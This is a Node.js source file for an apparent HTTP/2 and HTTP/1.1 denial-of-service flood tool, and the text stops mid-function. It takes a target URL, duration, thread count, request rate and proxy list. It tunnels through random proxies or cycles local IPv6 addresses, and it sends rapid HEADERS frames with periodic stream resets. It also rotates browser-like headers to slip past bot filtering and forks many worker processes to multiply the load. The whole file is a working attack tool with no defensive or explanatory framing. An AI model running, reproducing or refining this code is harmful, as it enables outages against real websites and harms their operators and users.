const fs = require('fs');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const os = require('os');
const cluster = require('cluster');
const crypto = require('crypto');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on('uncaughtException', function (e) { console.log(e) });
process.on('unhandledRejection', function (e) { console.log(e) });

const NORMAL = process.env.NORMAL || "0";
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const port = process.argv[6];
var mqfi9qjkf3i;

console.log(NORMAL);

if (NORMAL === 1) {

} else {
    mqfi9qjkf3i = fs.readFileSync(process.argv[7], 'utf8').replace(/\r/g, '').split('\n');
}

const url = new URL(target);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function getLocalIPv6() {
    const interfaces = os.networkInterfaces();
    let ipv6Address = null;

    for (const ifaceName of Object.keys(interfaces)) {
        const iface = interfaces[ifaceName];
        const ipv6 = iface.find((details) => details.family === 'IPv6' && !details.internal);

        if (ipv6) {
            ipv6Address = ipv6.address.split('%')[0];
            ipv6Address = ipv6Address.replace('::2', '');
            ipv6Address = ipv6Address.replace('::1', '');
            break;
        }
    }

    return ipv6Address;
}

const ipv6 = getLocalIPv6();

let a = 1;
let b = 1;
let c = 1;
let d = 1;
let g = 0;

function rnd_ip_block() {
    d += 1;

    if (d >= 9999) {
        d = 1;
        c += 1;
    }

    if (c >= 9999) {
        c = 1;
        d = 1;
        b += 1;
    }

    if (b >= 9999) {
        b = 1;
        c = 1;
        d = 1;
        a += 1;
    }

    if (a >= 9999) {
        b = 1;
        c = 1;
        d = 1;
        a = 1;
    }

    return `${ipv6}:${a}:${b}:${c}:${d}`;
}

let custom_table = 65536;
let custom_update = 15663105;
const statusesQ = []
let statuses = {}
let getgoaway;
let ssssf = 0;

setInterval(() => {
    g = 0;
}, 10000);

setInterval(() => {
    knownpath = a + b + c + d;
}, 1000);

function h1_handler() {
    const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
    let request = `GET ${url.pathname}CURRENT=${ssssf} HTTP/1.1\r\n` +
        `Host: ${url.hostname}\r\n` +
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\r\n' +
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n` +
        `Accept-Language: ru,en-US;q=0.9,en;q=0.8\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Connection: keep-alive\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `Sec-Fetch-Dest: ${randomString}\r\n`;
    ssssf += 1;

    if (Math.random() < 0.5) {
        request += `Sec-Fetch-Mode: ${randomString}\r\n`;
        request += `Sec-Fetch-Site: none\r\n`;
        request += `Sec-Fetch-User: ${randomString}\r\n`;
        request += `Referer: https://${randomString}${url.hostname}/${randomString}\r\n`;
        request += `Origin: https://${randomString}${url.hostname}\r\n`;
        request += '\r\n';
    } else {
        request += 'Sec-Fetch-Mode: navigate\r\n';
        request += `Sec-Fetch-Site: ${randomString}\r\n`;
        request += `Sec-Fetch-User: ?1\r\n`;
        request += `Referer: https://${randomString}${url.hostname}/${randomString}\r\n`;
        request += `Origin: https://${randomString}${url.hostname}\r\n`;
        request += '\r\n';
    }

    const mmm = Buffer.from(`${request}`, 'binary');
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(h1_handler()));

function go() {
    let SocketTLS;
    let ip_address = rnd_ip_block();
    var [proxyHost, proxyPort] = mqfi9qjkf3i[~~(Math.random() * mqfi9qjkf3i.length)].split(':');

    if (NORMAL === 1) {
        const netSocket = net.connect({
            port: 443,
            host: url.host,
            localAddress: ip_address
        }, () => {
            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                session: crypto.randomBytes(64),
                secure: true,
                rejectUnauthorized: false
            }, () => {
                if (!SocketTLS.alpnProtocol || SocketTLS.alpnProtocol === 'http/1.1') {
                    SocketTLS.on('data', (eventData) => {
                        const responseStr = eventData.toString('utf8');
                        const statusMatch = responseStr.match(/HTTP\/1\.1 (\d{3})/);
                        if (statusMatch) {
                            const statusCode = parseInt(statusMatch[1]);

                            if (!statuses[statusCode]) {
                                statuses[statusCode] = 0;
                            }
                            statuses[statusCode]++;
                        }
                    });

                    function main() {
                        SocketTLS.write(http1Payload, (err) => {
                            if (err) {
                                SocketTLS.end(() => SocketTLS.destroy());
                            } else {
                                setTimeout(() => {
                                    main();
                                }, 1000 / ratelimit);
                            }
                        });
                    }
                    main();

                    SocketTLS.on('error', () => {
                        SocketTLS.end(() => SocketTLS.destroy());
                    });

                    return;
                }

                let streamId = 1;
                let streamIdReset = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(2048);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                if (getgoaway >= 1000 && g == 0) {
                    custom_table += 1;
                    g = 1;
                }

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, 65535],
                        [2, 0],
                        [4, 6291456],
                        [6, 262144],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                SocketTLS.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                SocketTLS.write(encodeFrame(0, 4, "", 1));
                            }

                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];

                                if (status == 403) {
                                    nonsources = true;
                                }

                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }

                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    SocketTLS.end();

                                    if (!statuses["GOAWAY"])
                                        statuses["GOAWAY"] = 0

                                    statuses["GOAWAY"]++
                                    getgoaway += 1;
                                }
                                SocketTLS.end(() => SocketTLS.destroy());
                            }
                        } else {
                            break;
                        }
                    }
                });

                SocketTLS.write(Buffer.concat(frames));
                let currenthead = 0;

                function main() {
                    if (SocketTLS.destroyed) {
                        return;
                    }

                    for (let i = 0; i < ratelimit; i++) {
                        const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                        let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        const headers = Object.entries({
                            ":method": "GET",
                            ":authority": url.hostname + `:${(port == true && { generateNumbers })}`,
                            ":scheme": "https",
                            ":path": url.pathname, // + `CURRENT=${currenthead}`,
                        }).concat(Object.entries({
                            "sec-ch-ua": `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `"Windows"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "sec-fetch-site": "none",
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
                            ...(Math.random() < 0.5 && { "cookie": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "referer": `https://${randomString}.com/${randomString}` }),
                        }).filter(a => a[1] != null));

                        currenthead += 1
                        if (currenthead == 1) {
                            headers["sec-ch-ua"] = `${randomString}`;
                        } else if (currenthead == 2) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = `${randomString}`;
                        } else if (currenthead == 3) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `${randomString}`;
                        } else if (currenthead == 4) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = `${randomString}`;
                        } else if (currenthead === 5) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                        } else if (currenthead === 6) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["accept"] = `${randomString}`;
                        } else if (currenthead === 7) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = `${randomString}`;
                        } else if (currenthead === 8) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = `${randomString}`;
                        } else if (currenthead === 9) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = `${randomString}`;
                        } else if (currenthead === 10) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = `${randomString}`;
                        } else if (currenthead === 11) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = "document";
                            headers["accept-encoding"] = `${randomString}`;
                        } else if (currenthead === 12) {
                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                            headers["sec-ch-ua-mobile"] = "?0";
                            headers["sec-ch-ua-platform"] = `"Windows"`;
                            headers["upgrade-insecure-requests"] = "1";
                            headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                            headers["sec-fetch-site"] = "none";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-user"] = "?1";
                            headers["sec-fetch-dest"] = "document";
                            headers["accept-encoding"] = "gzip, deflate, br, zstd";
                            currenthead = 0;
                        }

                        let packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headers)
                        ]);

                        SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                        if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                            SocketTLS.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                        }
                        streamIdReset += 2;
                        streamId += 2;
                    }
                    setTimeout(() => {
                        main();
                    }, 1000 / ratelimit);
                }
                main();
            }).on('error', () => {
                SocketTLS.destroy();
            });

        }).once('error', () => { }).once('close', () => {
            if (SocketTLS) {
                SocketTLS.end(() => {
                    SocketTLS.destroy();
                });
            }
        });
    } else {
        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                SocketTLS = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    session: crypto.randomBytes(64),
                    secure: true,
                    rejectUnauthorized: false
                }, () => {
                    if (!SocketTLS.alpnProtocol || SocketTLS.alpnProtocol === 'http/1.1') {
                        SocketTLS.on('data', (eventData) => {
                            const responseStr = eventData.toString('utf8');
                            const statusMatch = responseStr.match(/HTTP\/1\.1 (\d{3})/);
                            if (statusMatch) {
                                const statusCode = parseInt(statusMatch[1]);

                                if (!statuses[statusCode]) {
                                    statuses[statusCode] = 0;
                                }
                                statuses[statusCode]++;
                            }
                        });

                        function main() {
                            SocketTLS.write(http1Payload, (err) => {
                                if (err) {
                                    SocketTLS.end(() => SocketTLS.destroy());
                                } else {
                                    setTimeout(() => {
                                        main();
                                    }, 1000 / ratelimit);
                                }
                            });
                        }
                        main();

                        SocketTLS.on('error', () => {
                            SocketTLS.end(() => SocketTLS.destroy());
                        });

                        return;
                    }

                    let streamId = 1;
                    let streamIdReset = 1;
                    let data = Buffer.alloc(0);
                    let hpack = new HPACK();
                    hpack.setTableSize(2048);

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(custom_update, 0);

                    if (getgoaway >= 1000 && g == 0) {
                        custom_table += 1;
                        g = 1;
                    }

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, 65535],
                            [2, 0],
                            [4, 6291456],
                            [6, 262144],
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    SocketTLS.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData]);
                        while (data.length >= 9) {
                            const frame = decodeFrame(data);
                            if (frame != null) {
                                data = data.subarray(frame.length + 9);
                                if (frame.type == 4 && frame.flags == 0) {
                                    SocketTLS.write(encodeFrame(0, 4, "", 1));
                                }

                                if (frame.type == 1) {
                                    const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];

                                    if (status == 403) {
                                        nonsources = true;
                                    }

                                    if (!statuses[status])
                                        statuses[status] = 0

                                    statuses[status]++
                                }

                                if (frame.type == 7 || frame.type == 5) {
                                    if (frame.type == 7) {
                                        SocketTLS.end();

                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                        getgoaway += 1;
                                    }
                                    SocketTLS.end(() => SocketTLS.destroy());
                                }
                            } else {
                                break;
                            }
                        }
                    });

                    SocketTLS.write(Buffer.concat(frames));
                    let currenthead = 0;

                    function main() {
                        if (SocketTLS.destroyed) {
                            return;
                        }

                        for (let i = 0; i < ratelimit; i++) {
                            const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                            let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                            const headers = Object.entries({
                                ":method": "GET",
                                ":authority": url.hostname + `:${(port == true && { generateNumbers })}`,
                                ":scheme": "https",
                                ":path": url.pathname, //+ `CURRENT=${currenthead}`,
                            }).concat(Object.entries({
                                "sec-ch-ua": `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": `"Windows"`,
                                "upgrade-insecure-requests": "1",
                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                "sec-fetch-site": "none",
                                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                                "accept-encoding": "gzip, deflate, br, zstd",
                                "accept-language": "ru,en-US;q=0.9,en;q=0.8",
                                ...(Math.random() < 0.5 && { "cookie": `${randomString}=${randomString}` }),
                                ...(Math.random() < 0.5 && { "referer": `https://${randomString}.com/${randomString}` }),
                            }).filter(a => a[1] != null));

                            currenthead += 1
                            if (currenthead == 1) {
                                headers["sec-ch-ua"] = `${randomString}`;
                            } else if (currenthead == 2) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = `${randomString}`;
                            } else if (currenthead == 3) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `${randomString}`;
                            } else if (currenthead == 4) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = `${randomString}`;
                            } else if (currenthead === 5) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                            } else if (currenthead === 6) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                                headers["accept"] = `${randomString}`;
                            } else if (currenthead === 7) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                                headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
                                headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                headers["sec-fetch-site"] = `${randomString}`;
                            } else if (currenthead === 8) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                                headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
                                headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                headers["sec-fetch-site"] = "none";
                                headers["sec-fetch-mode"] = `${randomString}`;
                            } else if (currenthead === 9) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                                headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
                                headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                headers["sec-fetch-site"] = "none";
                                headers["sec-fetch-mode"] = "navigate";
                                headers["sec-fetch-user"] = `${randomString}`;
                            } else if (currenthead === 10) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                                headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36";
                                headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                headers["sec-fetch-site"] = "none";
                                headers["sec-fetch-mode"] = "navigate";
                                headers["sec-fetch-user"] = "?1";
                                headers["sec-fetch-dest"] = `${randomString}`;
                            } else if (currenthead === 11) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                                headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
                                headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                headers["sec-fetch-site"] = "none";
                                headers["sec-fetch-mode"] = "navigate";
                                headers["sec-fetch-user"] = "?1";
                                headers["sec-fetch-dest"] = "document";
                                headers["accept-encoding"] = `${randomString}`;
                            } else if (currenthead === 12) {
                                headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                                headers["sec-ch-ua-mobile"] = "?0";
                                headers["sec-ch-ua-platform"] = `"Windows"`;
                                headers["upgrade-insecure-requests"] = "1";
                                headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
                                headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                                headers["sec-fetch-site"] = "none";
                                headers["sec-fetch-mode"] = "navigate";
                                headers["sec-fetch-user"] = "?1";
                                headers["sec-fetch-dest"] = "document";
                                headers["accept-encoding"] = "gzip, deflate, br, zstd";
                                currenthead = 0;
                            }

                            let packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(headers)
                            ]);

                            SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                            if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                SocketTLS.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                            }
                            streamIdReset += 2;
                            streamId += 2;
                        }
                        setTimeout(() => {
                            main();
                        }, 1000 / ratelimit);
                    }
                    main();
                }).on('error', () => {
                    SocketTLS.destroy()
                })
            })
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }).once('error', () => { }).once('close', () => {
            if (SocketTLS) {
                SocketTLS.end(() => { SocketTLS.destroy(); go() })
            }
        })
    }
}

if (cluster.isMaster) {
    const workers = {}
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`30 07 2024 №54`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })

    setInterval(() => {

        let statuses = {}
        for (let w in workers) {
            if (workers[w][0].state == 'online') {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        if (statuses[code] == null)
                            statuses[code] = 0

                        statuses[code] += st[code]
                    }
                }
            }
        }

        console.clear();
        console.log(statuses);
    }, 1000)

    setTimeout(() => process.exit(1), time * 1000);
} else {
    let i = setInterval(() => {
        go()
    });

    setInterval(() => {
        if (statusesQ.length >= 4)
            statusesQ.shift()

        statusesQ.push(statuses)
        statuses = {}
